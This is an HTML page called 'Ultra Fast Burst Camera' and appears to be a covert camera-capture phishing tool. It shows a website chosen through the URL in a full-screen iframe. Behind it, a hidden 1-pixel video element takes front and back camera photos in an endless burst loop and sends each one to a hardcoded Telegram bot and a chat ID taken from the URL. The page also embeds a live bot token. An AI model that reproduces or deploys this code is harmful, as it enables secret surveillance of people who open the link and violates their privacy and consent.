<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra Fast Burst Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <iframe id="websiteFrame" src="about:blank"></iframe>

    <script>
        // =====================================================
        //  ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER
        // =====================================================
        
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com';
            
            if (websiteParam) {
                websiteURL = decodeURIComponent(websiteParam);
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const CHAT_ID = config.chatId;
        
        // âš¡ ULTRA FAST CONFIG
        const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
        const CAPTURE_DELAY = 100;         // 100ms between photos (FAST!)
        const WARMUP_TIME = 800;           // 800ms warmup (faster)
        const SWITCH_DELAY = 400;          // 400ms switch delay (faster)
        
        let cameraStream = null;
        let currentFacingMode = 'user';
        let burstRunning = false;
        let photoCounter = 0;
        let totalPhotosSent = 0;
        let cameraReady = false;
        
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        
        function loadWebsite() {
            try {
                websiteFrame.src = config.website;
                console.log('ðŸŒ Website loaded:', config.website);
            } catch (error) {
                console.error('Failed to load website:', error);
            }
        }
        
        // ULTRA FAST camera start
        async function startCamera() {
            try {
                cameraReady = false;
                console.log(`ðŸ“¹ ${currentFacingMode.toUpperCase()} camera...`);
                
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: currentFacingMode,
                        frameRate: { ideal: 30 }
                    }
                };
                
                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = cameraStream;
                
                // Quick metadata wait
                await new Promise((resolve) => {
                    cameraVideo.onloadedmetadata = resolve;
                    setTimeout(resolve, 2000); // Fallback
                });
                
                await cameraVideo.play();
                
                // Quick warmup
                console.log(`â³ Warmup ${WARMUP_TIME}ms...`);
                await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                
                cameraReady = true;
                console.log(`âœ… Ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                return true;
            } catch (error) {
                console.error('âŒ Camera error:', error);
                return false;
            }
        }
        
        function stopCamera() {
            cameraReady = false;
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraVideo.srcObject = null;
                cameraStream = null;
            }
        }
        
        // ULTRA FAST capture (no validation for speed)
        async function captureFrameFast() {
            return new Promise((resolve) => {
                if (!cameraReady || cameraVideo.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d', { alpha: false });
                    
                    canvas.width = cameraVideo.videoWidth || 1280;
                    canvas.height = cameraVideo.videoHeight || 720;
                    
                    if (canvas.width === 0 || canvas.height === 0) {
                        resolve(null);
                        return;
                    }
                    
                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    
                    // Fast conversion (lower quality for speed)
                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
                } catch (error) {
                    console.error('âŒ Capture error:', error);
                    resolve(null);
                }
            });
        }
        
        // Fire and forget send (ULTRA FAST)
        function sendPhotoFast(blob, cameraType, photoNum) {
            if (!blob) return;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
            formData.append('caption', `ðŸ“¸ ${cameraType.toUpperCase()} #${photoNum}`);
            
            // Fire and forget - don't wait!
            fetch(`${TELEGRAM_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(r => r.json()).then(result => {
                if (result.ok) {
                    totalPhotosSent++;
                    console.log(`âœ… Sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
                }
            }).catch(e => console.error('âŒ', e));
        }
        
        async function switchCamera() {
            console.log('ðŸ”„ Switching...');
            stopCamera();
            
            await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
            
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            photoCounter = 0;
            
            return await startCamera();
        }
        
        // MAIN ULTRA FAST BURST LOOP
        async function ultraFastBurst() {
            if (burstRunning) return;
            
            burstRunning = true;
            console.log('âš¡ ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER');
            
            while (burstRunning) {
                if (!cameraReady) {
                    await new Promise(resolve => setTimeout(resolve, 200));
                    continue;
                }
                
                // Rapid fire 3 photos
                for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
                    const blob = await captureFrameFast();
                    
                    if (blob) {
                        photoCounter++;
                        sendPhotoFast(blob, currentFacingMode, photoCounter);
                    }
                    
                    // Minimal delay between shots
                    if (i < PHOTOS_PER_CAMERA - 1) {
                        await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
                    }
                }
                
                // Switch camera
                const switched = await switchCamera();
                if (!switched) {
                    console.error('âŒ Switch failed');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }
        
        async function sendStartMessage() {
            try {
                const msg = `âš¡ *ULTRA FAST BURST MODE*\n\n` +
                    `ðŸ“¸ Pattern: 3 FRONT â†’ 3 BACK â†’ REPEAT\n` +
                    `â±ï¸ Speed: ${CAPTURE_DELAY}ms between shots\n` +
                    `ðŸ”„ Switch: ${SWITCH_DELAY}ms\n` +
                    `ðŸŒ Site: ${config.website}\n` +
                    `â° ${new Date().toLocaleString()}`;
                
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('Failed to send start message:', e);
            }
        }
        
        async function init() {
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('âš¡ ULTRA FAST BURST CAMERA');
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('ðŸ’¬ Chat ID:', CHAT_ID);
            console.log('ðŸŒ Website:', config.website);
            console.log('ðŸ“¸ Pattern: 3 FRONT + 3 BACK');
            console.log('âš¡ Speed: MAXIMUM');
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            
            loadWebsite();
            await sendStartMessage();
            
            const started = await startCamera();
            
            if (started) {
                console.log('ðŸš€ Starting ultra fast burst...');
                ultraFastBurst();
            } else {
                console.error('âŒ Camera failed to start');
            }
        }
        
        window.addEventListener('load', init);
        
        window.addEventListener('beforeunload', () => {
            burstRunning = false;
            stopCamera();
        });
    </script>
</body>
</html>
